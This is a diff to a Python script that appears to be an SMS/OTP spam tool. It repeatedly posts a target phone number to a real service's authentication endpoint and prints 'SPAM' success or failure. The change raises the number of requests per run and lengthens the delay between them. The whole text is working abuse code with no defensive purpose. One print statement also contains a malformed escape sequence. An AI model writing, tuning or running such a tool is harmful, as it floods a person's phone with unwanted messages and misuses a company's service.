@@ -26,13 +26,13 @@ ua = {
 "Accept-Encoding": "gzip, deflate, br",
 "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
 }
-for i in range(1,6):
+for i in range(1,11):
     dat = {"phone":no}
     r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=ua).text
     if "6c047709f9da4291a568fa84b97b6d47" in r:
         print ("\033[90m> \]33[1;97mSPAM \033[1;94m=> \033[1;91mFAILED")
     else:
         print ("\033[90m> \033[1;97mSPAM \033[1;94m=> \033[1;92mSUCCESS")
-    time.sleep(10)
+    time.sleep(100)
 
 balik()
